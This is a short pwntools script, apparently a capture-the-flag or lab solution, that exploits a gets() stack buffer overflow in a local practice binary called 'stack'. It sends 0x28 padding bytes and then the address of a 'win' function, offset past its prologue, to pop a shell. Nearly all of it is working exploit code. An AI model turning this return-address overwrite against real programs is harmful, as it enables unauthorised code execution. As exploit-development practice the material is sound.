from pwn import *

context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"

e = ELF("./stack")
p = gdb.debug("./stack", '''
    continue
''')
p.recvuntil(b"??\n")
# calculate length of `push rbp` instruction:
a = asm("endbr64 ; push rbp")
# need to send a newline for gets
p.sendline(b'B' * 0x28 + p64(e.symbols.win + len(a)))
# drop into interactive shell to use shell we popped!
p.interactive()
